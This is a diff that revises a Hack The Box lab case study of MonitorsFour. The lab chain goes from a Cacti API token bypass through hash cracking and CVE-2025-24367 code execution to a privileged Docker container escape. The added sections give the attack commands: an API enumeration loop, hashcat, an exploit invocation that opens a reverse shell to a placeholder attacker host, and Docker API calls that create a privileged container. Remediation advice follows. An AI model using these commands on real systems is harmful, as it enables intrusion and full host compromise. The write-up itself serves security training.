@@ -1,5 +1,5 @@
 ---
-title: "Container Monitoring Lab — API IDOR to Privileged Container Escape"
+title: "MonitorsFour — Cacti API Token Bypass to Privileged Docker Escape"
 description: "An API access-control flaw exposes password hashes, and an unauthenticated Docker daemon allows a privileged container escape to host root."
 type: case-study
 platform: Hack The Box
@@ -12,85 +12,181 @@ tags:
   - cacti
   - api
   - container-escape
+objective: "Escalate from an unauthenticated API access-control bypass to host root through a Docker daemon exposed without authentication."
+tools:
+  - rustscan
+  - curl
+  - hashcat
+  - username-anarchy
+  - Burp Intruder
+skill: "Containerized application exploitation and unauthenticated Docker daemon abuse"
+outcome: "Authenticated Cacti code execution as www-data inside the container and host root via a privileged container created through the unauthenticated Docker API"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Medium |
+| Target environment | Linux host running a Cacti 1.2.28 monitoring instance inside a Docker container |
+| Starting position | Unauthenticated network access |
+| Objective | Turn an exposed Cacti API into authenticated access and code execution, then reach the underlying host through the Docker daemon API |
+| Outcome | Code execution as `www-data` inside the container and root on the underlying host |
 
 ## Summary
 
-This Hack The Box lab runs network monitoring inside a Docker container. A broken access-control flaw in its API (`token=0` bypass) exposes MD5 password hashes for multiple users. After cracking the hashes and generating valid usernames from discovered full names, authenticated access is obtained. CVE-2025-24367 provides authenticated remote code execution within the container. The Docker daemon API is exposed without authentication on an internal network, allowing creation of a privileged container with the host filesystem mounted — yielding root on the underlying host.
+MonitorsFour is a Medium-rated Hack The Box Linux lab that runs Cacti network monitoring inside a Docker container. A broken access-control check on the Cacti API accepts `token=0` and returns account records with raw MD5 password hashes to unauthenticated callers. One hash is cracked offline, and username permutations generated from the full names returned by the same API yield a working Cacti login. With authenticated access, CVE-2025-24367 provides code execution as `www-data` inside the container. From there an unauthenticated Docker daemon API on an internal address allows a privileged container with the host filesystem mounted, returning root on the host. IP addresses, hostnames, accounts, artifacts, and credential values are replaced with role-based placeholders, and flag values are omitted.
+
+**Attack path:** **API access-control bypass (`token=0`) → MD5 hash disclosure → offline cracking → username generation → Cacti authentication → CVE-2025-24367 container RCE → unauthenticated Docker daemon → privileged container with host mount → host root**
 
 ## Context and Objective
 
-The target is a Cacti monitoring instance deployed in Docker. Enumeration reveals an API endpoint that returns user data including MD5 password hashes when supplied with `token=0`. The objective is to leverage the exposed hashes to gain authenticated Cacti access, exploit a known vulnerability for container code execution, and escape to the host via the unprotected Docker API.
-
-All IPs, credentials, and artifacts are replaced with role-based placeholders. The flags are omitted.
+- **Target:** a Cacti 1.2.28 monitoring instance deployed in Docker on a Linux host.
+- **Discovery:** port scanning surfaced the HTTP service, and the Cacti application was reached over a virtual host.
+- **Starting position:** unauthenticated network access, with no provided credentials.
+- **Objective:** convert an exposed API into authenticated Cacti access, obtain code execution inside the container, and reach the underlying host through the Docker API.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
-### Stage 1 — API IDOR and Hash Extraction
+### 1. API access-control bypass and hash disclosure
 
-Rustscan identified open ports. Adding `<TARGET_HOSTNAME>` and `<APPLICATION_HOSTNAME>` to the hosts file resolved the virtual hosts.
-
-The Cacti API endpoint at `/api/v1/user` accepts a `token` parameter. Setting `token=0` bypasses authentication entirely, returning user records without valid credentials:
+Observation: the Cacti API exposes an `/api/v1/user` endpoint that takes a `token` parameter; supplying `token=0` is accepted and returns user records without valid credentials.
 
 ```bash
-curl -X GET "http://<TARGET>/api/v1/user?token=0&id=2"
+for i in $(seq 1 1000); do
+    result=$(curl -s "http://<TARGET_HOSTNAME>/api/v1/user?token=0&id=$i")
+    if ! echo "$result" | grep -q '"error"'; then
+        echo "ID $i: $result"
+    fi
+done
 ```
 
-Iterating IDs 1–1000 returned four user accounts with MD5 password hashes. The admin hash was cracked against a common wordlist, yielding the credential `admin:<ADMIN_PASSWORD>`.
+Iterating the `id` range returns four account records, each carrying a raw MD5 password hash:
 
-### Stage 2 — Username Generation and Cacti Access
+```text
+<API_ACCOUNT>:<MD5_HASH_1>
+<LAB_USER_1>:<MD5_HASH_2>
+<LAB_USER_2>:<MD5_HASH_3>
+<LAB_USER_3>:<MD5_HASH_4>
+```
 
-The application login page rejected `admin` as a username. The API also returned full names for each account. Using `username-anarchy` to generate username permutations from these full names, each permutation was tested against the application. The username `<VALID_APPLICATION_USER>` paired with the cracked password provided valid authentication.
+Significance: `token=0` is treated as a valid token, so the endpoint performs no caller authentication and returns credential material to anyone who can reach it.
+
+Result: four account records, including MD5 password hashes, are retrieved without authentication.
+
+### 2. Offline hash cracking
+
+Observation: the disclosed hashes are raw MD5, which is fast to attack offline against a wordlist.
+
+```bash
+hashcat -m 0 hashes.txt <WORDLIST> -D2 -w4
+```
+
+One hash resolves to a plaintext password:
+
+```text
+<MD5_HASH_1>:<API_ACCOUNT_PASSWORD>
+```
+
+Significance: raw MD5 offers no meaningful resistance to wordlist cracking, and the recovered value is a reusable credential.
+
+Result: one account password is recovered from the disclosed hash.
+
+### 3. Username generation and Cacti authentication
+
+Observation: the Cacti login rejects `<API_ACCOUNT>` as a username, but the same API also returns each account's full name.
 
 ```bash
 ./username-anarchy -i names.list > usernames.anarchy
 ```
 
-Burp Intruder confirmed `<VALID_APPLICATION_USER>:<ADMIN_PASSWORD>` as the working credential.
+The generated permutations are tested against the login form (Burp Intruder), and one pairing authenticates.
 
-### Stage 3 — CVE-2025-24367 (Cacti Authenticated RCE)
+Significance: application login names differ from API account names, so the recovered password only becomes usable after username generation and systematic testing.
 
-With valid Cacti credentials, CVE-2025-24367 was exploited to achieve code execution within the Docker container. The exploit established a reverse shell as `www-data` inside the container:
+Result: authenticated access to the Cacti application is obtained as `<VALID_APPLICATION_USER>` using the recovered password.
+
+### 4. Cacti authenticated RCE — CVE-2025-24367
+
+Observation: Cacti 1.2.28 is affected by CVE-2025-24367, in which an authenticated user abuses graph and template functionality to write arbitrary PHP into the application web root.
 
 ```bash
 python3 exploit.py \
-   -u '<VALID_APPLICATION_USER>' -p '<ADMIN_PASSWORD>' \
+  -u '<VALID_APPLICATION_USER>' -p '<API_ACCOUNT_PASSWORD>' \
   -i '<ATTACKER_IP>' -l '<SHELL_PORT>' \
-   --url 'http://<APPLICATION_HOSTNAME>'
+  --url 'http://<APPLICATION_HOSTNAME>'
 ```
 
-The notes report successful exploitation returning a shell inside the container.
+Significance: the flaw converts authenticated access into remote code execution inside the Cacti container, bounded by the account the web service runs as.
 
-### Stage 4 — Docker API Exposure
+Result: an interactive reverse shell runs as `www-data` inside the Docker container.
 
-Internal network reconnaissance from the container revealed the Docker daemon API exposed on TCP port 2375 at `<DOCKER_API_HOST>` without authentication:
+### 5. Unauthenticated Docker daemon API exposure
+
+Observation: from inside the container, the Docker daemon API is reachable over TCP on port 2375 at an internal address without authentication.
 
 ```bash
 curl -s http://<DOCKER_API_HOST>:2375/version | python3 -m json.tool
 ```
 
-The response confirmed Docker was available. Listing available images identified a usable application image.
+```text
+"Version": "28.3.2"
+```
 
-### Stage 5 — Privileged Container Escape
+Significance: an unauthenticated Docker daemon is effectively root on the host, because any caller that can reach it can direct the daemon to run workloads.
 
-A container definition was submitted through the Docker API with privileged mode and a host-filesystem bind. The callback construction and API request sequence are omitted because they would be attack-ready.
+Result: The daemon answered without authentication and reported Docker 28.3.2.
 
-Starting the container returned a root shell on the host with access to a protected file.
+### 6. Privileged container escape
+
+Observation: the same unauthenticated API can list local images and accept a new container definition, so a privileged container can be created with the host filesystem bound into it.
+
+```bash
+curl -s http://<DOCKER_API_HOST>:2375/images/json
+curl -s -X POST -H "Content-Type: application/json" \
+  -d @<CONTAINER_SPEC> \
+  http://<DOCKER_API_HOST>:2375/containers/create
+curl -s -X POST http://<DOCKER_API_HOST>:2375/containers/<CONTAINER_ID>/start
+```
+
+The image list includes an application image already present on the host:
+
+```text
+<APPLICATION_IMAGE>
+```
+
+The container spec selects an image already present on the host, enables privileged mode, and binds the host root filesystem into the container (summarized, not literal).
+
+Significance: privileged mode combined with a host-filesystem bind removes the container boundary entirely, so code running in the new container runs on the host.
+
+Result: the documentation records a root shell on the host with the host filesystem mounted at `/host`.
 
 ## Challenges and Decisions
 
-The initial `admin` credential did not work for application login — the username did not match the application account. The full names discovered via the API enabled username generation, and systematic testing identified the correct application username. This highlighted the gap between API account names and application login usernames.
+| Challenge | Decision | Rationale |
+|---|---|---|
+| The recovered credential's account name was rejected at the Cacti login | Generate username permutations from the API-returned full names and test them | Application login names differ from API account names |
 
 ## Outcome
 
-The attack chain succeeded: broken API access control → hash extraction → credential cracking → username generation → Cacti authentication → CVE-2025-24367 RCE → Docker API abuse → privileged container escape → root on host. The exposed Docker API is the critical misconfiguration that enabled full host compromise.
+The evidence establishes authenticated Cacti code execution as `www-data` inside the container and host root through a privileged container created via the unauthenticated Docker API; the exposed Docker daemon on an internal address was the critical control failure.
 
 ## Lessons and Recommendations
 
-- **Never expose the Docker daemon API without authentication.** Binding the Docker daemon to TCP port 2375 without TLS client certificate authentication is unconditionally insecure. Use the Unix socket (`/var/run/docker.sock`) locally, or mutual TLS for remote access. Never mount `docker.sock` into containers.
-- **Implement server-side validation for all API authentication tokens.** The `token=0` bypass indicates missing validation. Every API endpoint must verify the caller's identity server-side. Trivially bypassed token values must be rejected.
-- **Patch Cacti promptly.** CVE-2025-24367 is a critical authenticated RCE. Cacti should be updated to the patched version, and access to the Cacti interface should be restricted to the management network.
+No remediation was tested in the lab; the following are recommendations.
+
+1. **Unauthenticated Docker daemon API.** Root cause: the daemon is exposed on TCP port 2375 without TLS client authentication. Demonstrated impact: any caller that can reach the API can create a privileged container with the host filesystem mounted, which is equivalent to root on the host. *Recommendation:* use the local Unix socket or mutual TLS for remote access, and never expose the daemon without authentication. *Detection:* alert on remote Docker API access and on creation of privileged containers.
+2. **Broken API token validation.** Root cause: the endpoint accepts `token=0` as an authenticated value. Demonstrated impact: unauthenticated retrieval of password hashes. *Recommendation:* validate the caller identity server-side and reject trivially bypassed token values, then rotate any exposed secrets. *Detection:* alert on unauthenticated API responses that contain credential fields.
+3. **MD5 password storage and reuse.** Root cause: passwords are stored as raw MD5 and one password is reused between the API account and the application login. Demonstrated impact: fast offline cracking and credential reuse within the same application. *Recommendation:* store passwords with a salted adaptive hash and enforce unique credentials. *Detection:* monitor for password reuse across accounts.
+4. **Cacti authenticated RCE (CVE-2025-24367).** Root cause: an authenticated user can create arbitrary PHP in the web root, fixed in Cacti 1.2.29. Demonstrated impact: code execution inside the container as the web service account. *Recommendation:* upgrade to the patched release and restrict access to the Cacti interface to a management network.
 
 ## References
 
-- CVE-2025-24367: Cacti Authenticated Remote Code Execution
+- [Hack The Box — MonitorsFour](https://app.hackthebox.com/machines/MonitorsFour)
+- [NVD — CVE-2025-24367](https://nvd.nist.gov/vuln/detail/CVE-2025-24367)
+- [Cacti Security Advisory GHSA-fxrq-fr7h-9rqq](https://github.com/Cacti/cacti/security/advisories/GHSA-fxrq-fr7h-9rqq) (authenticated PHP creation in the web root, fixed in 1.2.29)
+- [RustScan](https://github.com/RustScan/RustScan) (port scanning)
+- [Hashcat](https://hashcat.net/hashcat/) (offline password recovery)
+- [username-anarchy](https://github.com/urbanadventurer/username-anarchy) (username permutation generation)
+- [Docker — Protect the Docker daemon socket](https://docs.docker.com/engine/security/protect-access/) (TLS client authentication for the daemon API)
